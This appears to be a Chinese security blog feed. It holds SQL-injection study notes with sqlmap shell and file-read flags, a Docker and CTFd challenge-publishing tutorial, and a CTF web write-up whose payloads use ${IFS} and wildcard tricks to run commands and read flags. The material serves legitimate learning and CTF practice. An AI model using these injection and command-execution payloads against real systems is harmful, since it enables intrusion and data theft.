by关键字</strong><br>ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序(升序)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 字段所对应的序列号: 例如下面字段&lt;字段1&gt;字段序列号为1,当字段序列化超过select后面的字段数会报错(爆字段原理)</span><br><span class="line">select &lt;字段名1&gt;,&lt;字段名2&gt;,&lt;...&gt; from table order by &lt;字段名&gt;/&lt;字段所对应的序列号&gt;;</span><br></pre></td></tr></table></figure><p><strong>like 语句</strong><br>LIKE语句主要用于在WHERE子句中，以搜索匹配字段中的指定内容</p><ul><li>语法:   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> <span class="operator">&lt;</span>字段<span class="operator">&gt;</span> <span class="keyword">like</span> <span class="operator">&lt;</span>用于匹配的值<span class="operator">&gt;</span> (<span class="keyword">and</span><span class="operator">/</span><span class="keyword">or</span> ...); # 可以用通配符模糊搜索</span><br></pre></td></tr></table></figure></li><li>通配符:<br>LIKE主要支持两种通配符，分别是 <strong>_</strong> 和 <strong>%</strong>:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_ 代表匹配1个任意字符，常用于充当占位符。</span><br><span class="line">% 代表匹配0个或多个任意字符。</span><br></pre></td></tr></table></figure><strong>UNION 操作符</strong><br>UNION操作符用于将两个或更多的SELECT语句的结果组合到一个结果集中。这些SELECT语句默认会删除重复的数据,如果后面加上all则不会删除重复的数据</li><li>语法:  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">&lt;</span>语句<span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">union</span> (<span class="keyword">all</span>) <span class="keyword">select</span> <span class="operator">&lt;</span>语句<span class="number">2</span><span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li></ul><h1 id="sql-注入"><a href="#sql-注入" class="headerlink" title="sql 注入"></a>sql 注入</h1><h2 id="sql注入漏洞出现的关键"><a href="#sql注入漏洞出现的关键" class="headerlink" title="sql注入漏洞出现的关键"></a>sql注入漏洞出现的关键</h2><ul><li>参数用户可控 如: ?id&#x3D; 1 (不止于URL上面的参数)</li><li>参数带入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询</li></ul><h2 id="sql注入传参的方式"><a href="#sql注入传参的方式" class="headerlink" title="sql注入传参的方式"></a>sql注入传参的方式</h2><ul><li>get方式</li><li>post方式</li><li>xff方式(有ip记录功能的应用上(错误请求封ip,或记录后台登录的ip地址))</li><li>cookie注入(身份验证)</li></ul><h2 id="sql注入的不同注入方式"><a href="#sql注入的不同注入方式" class="headerlink" title="sql注入的不同注入方式"></a>sql注入的不同注入方式</h2><h3 id="盲注-用工具去操作-手工太麻烦了"><a href="#盲注-用工具去操作-手工太麻烦了" class="headerlink" title="盲注(用工具去操作,手工太麻烦了)"></a>盲注(用工具去操作,手工太麻烦了)</h3><p>特点: sql语句执行但是不在前端返回数据(没有回显点)，解决联合查询不行的情况，但是效率不行</p><ul><li>基于布尔的盲注(逻辑判断):<br>  有数据库输出判断标准,然后去猜解长度和名称</li><li>基于时间的盲注(延时判断):<br>  使用(if,sleep进行拼接)然后用bp的repeater发包 观察右下角的响应时间是否有延迟</li><li>基于报错的盲注(报错回显):<br>  如果开发者有对sql语句执行失败的报错处理,就可以使用一些函数来使他的报错处理显示出来并且带上我们需要的数据</li></ul><h3 id="堆叠注入-局限性较大"><a href="#堆叠注入-局限性较大" class="headerlink" title="堆叠注入(局限性较大)"></a>堆叠注入(局限性较大)</h3><p>用<code>;</code> 来注入多条sql语句,但是局限性较大</p><ul><li>使用堆叠注入需要看数据库类型,支持的有 MySQL MSSQL PostgreSQL等,主要是看是否支持多条sql语句</li><li>使用堆叠注入需要看源代码怎么处理和执行sql语句</li></ul><h3 id="二次注入-挺常用"><a href="#二次注入-挺常用" class="headerlink" title="二次注入(挺常用)"></a>二次注入(挺常用)</h3><p>原理是: 先插入恶意数据,然后再引用恶意数据,在找回密码处比较多(先注册一个用户名(存在恶意数据的用户名),然后找回密码去执行),因为开发者往往会信任已经存在数据库中的数据</p><h3 id="dnslog带外注入-解决数据不回显-反向连接-比较鸡肋"><a href="#dnslog带外注入-解决数据不回显-反向连接-比较鸡肋" class="headerlink" title="dnslog带外注入(解决数据不回显,反向连接,比较鸡肋)"></a>dnslog带外注入(解决数据不回显,反向连接,比较鸡肋)</h3><p>通过高权限用户让服务器去访问网站(dnslog.cn),然后通过这个网站来得到服务器数据的回显,一般是用来解决数据回显的(这种方法),用于注入相当鸡肋</p><p>反思: 如果我有高权限用户,我直接命令执行不是更好,但是他是可以解决数据不回显</p><h3 id="不同sql操作的注入-增删改查"><a href="#不同sql操作的注入-增删改查" class="headerlink" title="不同sql操作的注入(增删改查)"></a>不同sql操作的注入(增删改查)</h3><p>因为部分sql操作是不需要进行前端数据回显的,只需要在数据库里执行就行,所有需要采用盲注才能得到结果</p><h2 id="sql注入漏洞的攻击流程"><a href="#sql注入漏洞的攻击流程" class="headerlink" title="sql注入漏洞的攻击流程"></a>sql注入漏洞的攻击流程</h2><ol><li>判断注入点</li><li>根据经验判断数据库类型</li><li>根据数据库类型进行注入,获取敏感数据或者配置信息</li><li>看是否能够提权(如果是高权限用户,并且没有防护策略,可以通过load_file()去读取敏感文件,或者into outfile 去写入shell,如果遇到了mysql中 secure_file_priv参数设置的防护限制,可以尝试去通过得到sql执行环境(连上数据库或者通过phpmyadmin这种第三方组件来获得执行环境)来突破防护(通过启用MySQL中的慢日志记录来写入shell))</li></ol><h2 id="Access注入"><a href="#Access注入" class="headerlink" title="Access注入"></a>Access注入</h2><ul><li><p>简易注入:字典拆解</p><ol><li>先用order by 语句判断字段数</li><li>然后用union select语句配合字典去得到敏感数据<br>缺点 可能字典不能够猜出来表名和列名</li></ol></li><li><p>偏移注入:(已知表名的情况,不是特别多,遇到了网上搜blog)</p></li></ul><h2 id="Mysql注入流程-其他数据库都和mysql类似-就是注入语法不同而已"><a href="#Mysql注入流程-其他数据库都和mysql类似-就是注入语法不同而已" class="headerlink" title="Mysql注入流程(其他数据库都和mysql类似,就是注入语法不同而已)"></a>Mysql注入流程(其他数据库都和mysql类似,就是注入语法不同而已)</h2><h3 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h3><ol><li><p>获取mysql版本(用<code>select version();</code>来获取)</p><ul><li>在mysql 5.0版本后 对应用户数据库中会有一个<code>information_schema</code> 数据库,这个数据库中会存储数据库中的一些信息,如:数据库名,表名,列名,索引名等<br> 数据库名在SCHEMATA表中 表名在TABLES表中,列名在COLUMNS表中,索引名在STATISTICS表中  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 查询所有数据库的名称</span><br><span class="line">SELECT schema_name FROM information_schema.schemata;</span><br><span class="line">// 查询某数据库的所有表名</span><br><span class="line">SELECT table_name FROM information_schema.tables WHERE table_schema = &#x27;数据库名&#x27;;</span><br><span class="line">// 查询某个表中所有列的名称和数据类型</span><br><span class="line">SELECT column_name, data_type FROM information_schema.columns WHERE table_schema = &#x27;数据库名&#x27; AND table_name = &#x27;表名&#x27;;</span><br></pre></td></tr></table></figure></li><li>如果是mysql 5.0以下版本 就只能通过字典去爆破数据库名等</li></ul></li><li><p>获取当前用户权限(DBA)(用<code>select user(); </code>来获取)<br> 由于Mysql有用户权限设置,所以针对Mysql的注入分为两种d </p><ul><li>非Root的注入攻击: 常规类的猜解</li><li>Root的注入攻击: 文件读写操作,跨库查询注入等</li></ul></li><li><p>获取当前操作系统(大小写判断或者用<code>select @@version_compile_os</code>来获取)</p></li></ol><h3 id="构造payload攻击"><a href="#构造payload攻击" class="headerlink" title="构造payload攻击"></a>构造payload攻击</h3><ul><li>根据获取的信息先爆库名然后表名然后列名最后数据</li><li>如果是Root的话就可以进行跨库查询(access数据库没有权限设置)</li></ul><h2 id="sql注入的类型"><a href="#sql注入的类型" class="headerlink" title="sql注入的类型"></a>sql注入的类型</h2><h3 id="数字型-0-9"><a href="#数字型-0-9" class="headerlink" title="数字型(0-9)"></a>数字型(0-9)</h3><p>记得用–+或者 # 去注释后面的代码</p><h3 id="字符型-a-z-中文-标点符号"><a href="#字符型-a-z-中文-标点符号" class="headerlink" title="字符型(a-z,中文,标点符号)"></a>字符型(a-z,中文,标点符号)</h3><p>在数字型上面加入了单引号,要使用单引号去拼接</p><h3 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h3><p>在字符型上面添加了通配符,需要用通配符和单引号去拼接<br>但是后面(用–+)注释会报错,原因: 后面的语句会变成 <code>--+%&#39;</code> 然后产生报错 此时不能用<code>--+</code> 需要用 <code>and &#39;%&#39;=&#39;</code> 拼接为<code>and &#39;%&#39;=&#39;%&#39;</code> 永真式来绕过</p><h3 id="编码型"><a href="#编码型" class="headerlink" title="编码型"></a>编码型</h3><p>数据以编码值传递<br>发送编码值 -&gt; 解码 -&gt; 执行sql -&gt; 返回结果<br>payload需要编码来提交</p><h3 id="加密型"><a href="#加密型" class="headerlink" title="加密型"></a>加密型</h3><p>数据以加密的密文去发送</p><h3 id="格式型"><a href="#格式型" class="headerlink" title="格式型"></a>格式型</h3><p>数据如格式化形式发送 如:JSON<br><code>&#123;&quot;key&quot;:&quot;value&quot;&#125;</code><br>如果是注入value的话,由于取的值是双引号内的值<br>payload:<code>value&#39; union select 1,2,3#</code>  </p><h2 id="SQL注入工具-SqlMap"><a href="#SQL注入工具-SqlMap" class="headerlink" title="SQL注入工具(SqlMap)"></a>SQL注入工具(SqlMap)</h2><p>使用sqlmap前 最好先手工判断好注入点 然后用*标记注入点来注入</p><h3 id="SqlMap-数据库注入数据猜解"><a href="#SqlMap-数据库注入数据猜解" class="headerlink" title="SqlMap 数据库注入数据猜解"></a>SqlMap 数据库注入数据猜解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--is-dba 查看数据库当前用户权限</span><br><span class="line">--dbs 查看数据库</span><br><span class="line">--current-db 查看当前数据库</span><br><span class="line">--D &lt;数据库名&gt; --tables 查看该数据库下面所有表名</span><br><span class="line">--D &lt;数据库名&gt; -T &lt;表名&gt; --columns 查看该表下面所有字段名</span><br><span class="line">--D &lt;数据库名&gt; -T &lt;表名&gt; -C &quot;&lt;字段名1,字段名2&gt;&quot; --dump 获取该表下面指定字段内容</span><br></pre></td></tr></table></figure><h3 id="SqlMap-联动tamper脚本"><a href="#SqlMap-联动tamper脚本" class="headerlink" title="SqlMap 联动tamper脚本"></a>SqlMap 联动tamper脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--tamper=&lt;tamper脚本名称&gt; 使用tamper脚本 </span><br><span class="line">    unmagicquotes.py 宽字节注入脚本</span><br><span class="line">    base64encode.py  base64编码注入脚本</span><br></pre></td></tr></table></figure><h3 id="SqlMap-高权限注入读写执行"><a href="#SqlMap-高权限注入读写执行" class="headerlink" title="SqlMap 高权限注入读写执行"></a>SqlMap 高权限注入读写执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--file-read 读取文件</span><br><span class="line">--file-write 写入文件</span><br><span class="line">--os-shell 系统交互式shell</span><br><span class="line">--sql-shell 执行sql命令</span><br><span class="line">--reg-read 读取win注册表</span><br></pre></td></tr></table></figure><h3 id="SqlMap-高权限注入联动MSF"><a href="#SqlMap-高权限注入联动MSF" class="headerlink" title="SqlMap 高权限注入联动MSF"></a>SqlMap 高权限注入联动MSF</h3><p>先用msf生成后门和监听,然后用目标机去执行命令下载后门,执行后门 然后用msf来控制</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker学习以及CTFD题目发布</title>
      <link href="/2023/11/02/docker%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8ACTFD%E9%A2%98%E7%9B%AE%E5%8F%91%E5%B8%83/"/>
      <url>/2023/11/02/docker%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8ACTFD%E9%A2%98%E7%9B%AE%E5%8F%91%E5%B8%83/</url>
      
        <content type="html"><![CDATA[<h1 id="docker学习以及CTFD题目发布"><a href="#docker学习以及CTFD题目发布" class="headerlink" title="docker学习以及CTFD题目发布"></a>docker学习以及CTFD题目发布</h1><p>发布动态题目要用到docker,所以要先去了解docker是什么</p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><h3 id="什么是docker"><a href="#什么是docker" class="headerlink" title="什么是docker"></a>什么是docker</h3><p>Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的Linux机器上，也可以实现虚拟化。Docker是一种轻量级的虚拟化技术，同时是一个开源的应用容器运行环境搭建平台，可以让开发者以便捷方式打包应用到一个可移植的容器中，然后安装至任何运行Linux或Windows等系统的服务器上。相较于传统虚拟机，Docker容器提供轻量化的虚拟化方式、安装便捷、启停速度快。容器完全使用沙盒机制，相互之间不会存在任何接口。几乎没有性能开销，可以很容易地在机器和数据中心运行。</p><h3 id="镜像和容器"><a href="#镜像和容器" class="headerlink" title="镜像和容器"></a>镜像和容器</h3><p>在Docker中，镜像（Image）和容器（Container）是两个核心的概念：</p><ul><li><p>镜像（Image）：镜像是一个只读的模板，可以看作是由多个镜像层叠加起来的一个文件系统。每一层都有一个指针指向下一层，除了最底层。镜像包含运行容器所需的数据，例如程序运行代码和必要环境。你可以把镜像看作类，把容器看作类实例化后的对象。</p></li><li><p>容器（Container）：容器是由镜像实例化而来的运行实例。与镜像相似，唯一的区别在于容器多了一层可读写层。也就是说，容器&#x3D;镜像+读写层。容器中会运行特定的应用，包含特定应用的代码及所需的依赖文件。</p></li></ul><p>总结起来，简单来说，镜像是文件，容器是进程。容器是基于镜像创建的，即容器中的进程依赖于镜像中的文件。</p><h2 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a>docker常用命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">docker attach#连接到正在运行中的容器</span><br><span class="line">docker build#使用 Dockerfile 创建镜像</span><br><span class="line">docker commit &lt;容器ID&gt; &lt;你想要新建的镜像名字&gt; #从容器创建一个新的镜像</span><br><span class="line">docker config#管理Docker配置</span><br><span class="line">    docker config create#创建配置文件</span><br><span class="line">    docker config inspect#查看配置文件信息</span><br><span class="line">    docker config ls#显示docker里已经保存得配置文件</span><br><span class="line">    docker config rm#删除配置文件</span><br><span class="line">docker container#管理容器</span><br><span class="line">    docker container prune#删除所有已停止的容器</span><br><span class="line">docker cp#用于容器与主机之间的数据拷贝</span><br><span class="line">docker create#创建一个新的容器但不启动它</span><br><span class="line">docker exec#在运行的容器中执行命令</span><br><span class="line">docker history#查看指定镜像的创建历史</span><br><span class="line">docker image#管理镜像</span><br><span class="line">    docker image inspect#显示一个或多个镜像的元数据</span><br><span class="line">    docker image ls#列出本地镜像</span><br><span class="line">    docker image prune#删除没有使用的镜像</span><br><span class="line">    docker image rm#删除一个或多个镜像</span><br><span class="line">    docker image rmi -f &lt;镜像ID&gt; # 强制删除镜像</span><br><span class="line">docker images#列出本地镜像</span><br><span class="line">docker import#从归档文件中创建镜像</span><br><span class="line">docker info#显示 Docker 系统信息，包括镜像和容器数</span><br><span class="line">docker kill#杀掉一个运行中的容器</span><br><span class="line">docker load#导入使用 docker save 命令导出的镜像</span><br><span class="line">docker login#登陆到一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub</span><br><span class="line">docker logout#登出一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub</span><br><span class="line">docker logs#获取容器的日志</span><br><span class="line">docker pause#暂停容器中所有的进程</span><br><span class="line">docker plugin#管理插件</span><br><span class="line">    docker plugin create#从rootfs和配置创建一个插件。插件数据目录必须包含config.json和rootfs目录。</span><br><span class="line">    docker plugin disable#禁用插件</span><br><span class="line">    docker plugin enable#启用插件</span><br><span class="line">    docker plugin inspect#显示一个或多个插件的元数据</span><br><span class="line">    docker plugin install#安装一个插件</span><br><span class="line">    docker plugin ls#列出所有插件</span><br><span class="line">    docker plugin push#将插件推送到注册表</span><br><span class="line">    docker plugin rm#删除一个或多个插件</span><br><span class="line">    docker plugin set#更改插件的设置</span><br><span class="line">    docker plugin upgrade#升级现有插件</span><br><span class="line">docker port#列出指定的容器的端口映射，或者查找将PRIVATE_PORT NAT到面向公众的端口</span><br><span class="line">docker ps#列出所有正在运行的容器</span><br><span class="line">    docker ps -a#列出所有容器</span><br><span class="line">docker pull#从镜像仓库中拉取或者更新指定镜像</span><br><span class="line">docker push#将本地的镜像上传到镜像仓库,要先登陆到镜像仓库</span><br><span class="line">docker rename#重命名容器</span><br><span class="line">docker restart#重启容器</span><br><span class="line">docker rm#删除一个或多个容器</span><br><span class="line">docker rmi#删除一个或多个镜像</span><br><span class="line">docker run#创建一个新的容器并运行一个命令</span><br><span class="line">docker save#将指定镜像保存成 tar 归档文件</span><br><span class="line">docker search#从Docker Hub查找镜像</span><br><span class="line">docker start#启动一个或多个已经被停止的容器</span><br><span class="line">docker stats#显示容器的实时流资源使用统计信息</span><br><span class="line">docker stop#停止一个运行中的容器</span><br><span class="line">docker tag xxx/xxx yyyy/yyyy    # 改标签 x 为别人的 y为自己的</span><br><span class="line">docker top#查看容器中运行的进程信息，支持 ps 命令参数</span><br><span class="line">docker update#更新一个或多个容器的配置</span><br><span class="line">docker version#显示 Docker 版本信息</span><br></pre></td></tr></table></figure><h2 id="CTFD动态题目发布"><a href="#CTFD动态题目发布" class="headerlink" title="CTFD动态题目发布"></a>CTFD动态题目发布</h2><p>首先动态题目需要自定义flag,所以我们的实现思路是先拉取镜像,本地部署后然后在实例里面改相关的配置文件,最后再把该实例转化为镜像push到仓库中,然后使用CTFD的题目发布功能,将该镜像拉取下来构建题目。</p><p>这里以litctf中的导弹迷踪题目为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull probius/litctf2023:Web_Missile    # 首先拉取题目镜像到本地</span><br><span class="line">docker run -d probius/litctf2023:Web_Missile  # 新建一个容器用来运行题目镜像（后台运行容器）</span><br><span class="line">docker  ps # 查看在运行的容器</span><br></pre></td></tr></table></figure><p>然后得到如下:<br><img src="/img/docker%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8ACTFD%E9%A2%98%E7%9B%AE%E5%8F%91%E5%B8%83/1.png" alt="title"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 在正在运行的容器(bcf9d8fa6461)中启动一个交互式的sh shell</span><br><span class="line">docker exec -it bcf9d8fa6461 /bin/sh</span><br></pre></td></tr></table></figure><p><img src="/img/docker%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8ACTFD%E9%A2%98%E7%9B%AE%E5%8F%91%E5%B8%83/2.png" alt="title"><br>找到flag相关的文件,用vi 打开进行编辑<br><img src="/img/docker%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8ACTFD%E9%A2%98%E7%9B%AE%E5%8F%91%E5%B8%83/3.png" alt="title"><br>写入我们想要改成的flag<br><img src="/img/docker%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8ACTFD%E9%A2%98%E7%9B%AE%E5%8F%91%E5%B8%83/4.png" alt="title"><br>wq保存退出,exit 退出shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit bcf9d8fa6461 isyang666/mcmcxs2u11:ez_JsGame # 保存修改后的容器为一个新的镜像</span><br></pre></td></tr></table></figure><p><img src="/img/docker%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8ACTFD%E9%A2%98%E7%9B%AE%E5%8F%91%E5%B8%83/5.png" alt="title"><br>创建成功了<br>直接push到docker仓库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push isyang666/mcmcxs2u11:ez_JsGame</span><br></pre></td></tr></table></figure><p><img src="/img/docker%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8ACTFD%E9%A2%98%E7%9B%AE%E5%8F%91%E5%B8%83/6.png" alt="title"><br>然后用CTFD的题目发布功能将该镜像拉取下来构建题目<br><img src="/img/docker%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8ACTFD%E9%A2%98%E7%9B%AE%E5%8F%91%E5%B8%83/8.png" alt="title"><br><img src="/img/docker%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8ACTFD%E9%A2%98%E7%9B%AE%E5%8F%91%E5%B8%83/7.png" alt="title"><br>发布成功</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTFD </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023FSCTFwebWP</title>
      <link href="/2023/11/01/2023FSCTFwebWP/"/>
      <url>/2023/11/01/2023FSCTFwebWP/</url>
      
        <content type="html"><![CDATA[<h1 id="2023FSCTFwebWP"><a href="#2023FSCTFwebWP" class="headerlink" title="2023FSCTFwebWP"></a>2023FSCTFwebWP</h1><h2 id="源码！启动"><a href="#源码！启动" class="headerlink" title="源码！启动!"></a>源码！启动!</h2><p><img src="/img/2023FSCTFwebWP/11.png" alt="title"><br><img src="/img/2023FSCTFwebWP/12.png" alt="title"><br>F12和右键都被禁用了<br>Ctrl + U 查看源码<br><img src="/img/2023FSCTFwebWP/13.png" alt="title"><br>在源码最下面找到flag</p><h2 id="webshell是啥捏"><a href="#webshell是啥捏" class="headerlink" title="webshell是啥捏"></a>webshell是啥捏</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$😀=&quot;a&quot;;</span><br><span class="line">$😁=&quot;b&quot;;</span><br><span class="line">$😂=&quot;c&quot;;</span><br><span class="line">$🤣=&quot;d&quot;;</span><br><span class="line">$😃=&quot;e&quot;;</span><br><span class="line">$😄=&quot;f&quot;;</span><br><span class="line">$😅=&quot;g&quot;;</span><br><span class="line">$😆=&quot;h&quot;;</span><br><span class="line">$😉=&quot;i&quot;;</span><br><span class="line">$😊=&quot;j&quot;;</span><br><span class="line">$😋=&quot;k&quot;;</span><br><span class="line">$😎=&quot;l&quot;;</span><br><span class="line">$😍=&quot;m&quot;;</span><br><span class="line">$😘=&quot;n&quot;;</span><br><span class="line">$😗=&quot;o&quot;;</span><br><span class="line">$😙=&quot;p&quot;;</span><br><span class="line">$😚=&quot;q&quot;;</span><br><span class="line">$🙂=&quot;r&quot;;</span><br><span class="line">$🤗=&quot;s&quot;;</span><br><span class="line">$🤩=&quot;t&quot;;</span><br><span class="line">$🤔=&quot;u&quot;;</span><br><span class="line">$🤨=&quot;v&quot;;</span><br><span class="line">$😐=&quot;w&quot;;</span><br><span class="line">$😑=&quot;x&quot;;</span><br><span class="line">$😶=&quot;y&quot;;</span><br><span class="line">$🙄=&quot;z&quot;;</span><br><span class="line"></span><br><span class="line">$😭 = $😙. $😀. $🤗. $🤗. $🤩. $😆. $🙂. $🤔;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;👽&#x27;])) &#123;</span><br><span class="line">    eval($😭($_GET[&#x27;👽&#x27;]));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>简单的php代码审计，用Ctrl+F一个个查找用于拼接😭的表情所对应的字符，得到$😭&#x3D;passthru;<br>然后用GET方式提交👽,RCE即可<br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28408/?%F0%9F%91%BD=cat%20/f*</span><br></pre></td></tr></table></figure><p>得到flag<br><img src="/img/2023FSCTFwebWP/21.png" alt="title"></p><h2 id="细狗2-0"><a href="#细狗2-0" class="headerlink" title="细狗2.0"></a>细狗2.0</h2><p><img src="/img/2023FSCTFwebWP/31.png" alt="title"><br>一个输入框,用;闭合然后试试ls命令<br><img src="/img/2023FSCTFwebWP/32.png" alt="title"><br>有回显,应该可以rce,试一下cat<br><img src="/img/2023FSCTFwebWP/33.png" alt="title"><br>发现有waf,空格被过滤了(被waf用’+’代替了)<br>然后各种绕过姿势都试了一下<br>cat 可以用 nl head paste sort tac uniq tail代替<br>空格(%20) 可以用 %09(tab) %20(space)  \x09(tab)，也可以用(\x20) ${IFS} $IFS$1 $IFS代替<br>flag 可以用通配符’ * ‘和’ ? ‘ 代替<br>得到flag:<br><img src="/img/2023FSCTFwebWP/34.png" alt="title"><br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;nl$&#123;IFS&#125;/fl*</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hongzh0=1%3Bnl%24%7BIFS%7D%2Ffl*</span><br></pre></td></tr></table></figure><h2 id="Hello-you"><a href="#Hello-you" class="headerlink" title="Hello,you"></a>Hello,you</h2><p><img src="/img/2023FSCTFwebWP/41.png" alt="title"><br>一个简单的注册页面,题目提示是rce,简单的试一下<br>输入<strong>1;ls</strong><br>回显如下:<br><img src="/img/2023FSCTFwebWP/42.png" alt="title"><br>和上题一样,有waf,各种绕过姿势都试一下<br>得到flag<br><img src="/img/2023FSCTFwebWP/43.png" alt="title"><br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;head$&#123;IFS&#125;fla*</span><br></pre></td></tr></table></figure><h2 id="EZ-eval"><a href="#EZ-eval" class="headerlink" title="EZ_eval"></a>EZ_eval</h2><p><img src="/img/2023FSCTFwebWP/51.png" alt="title"></p><p>代码审计一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if(isset($_GET[&#x27;word&#x27;]))&#123;</span><br><span class="line">    $word = $_GET[&#x27;word&#x27;];</span><br><span class="line">    // 过滤了cat,tac,tail等命令,flag字符和&#x27; /&#x27;符号  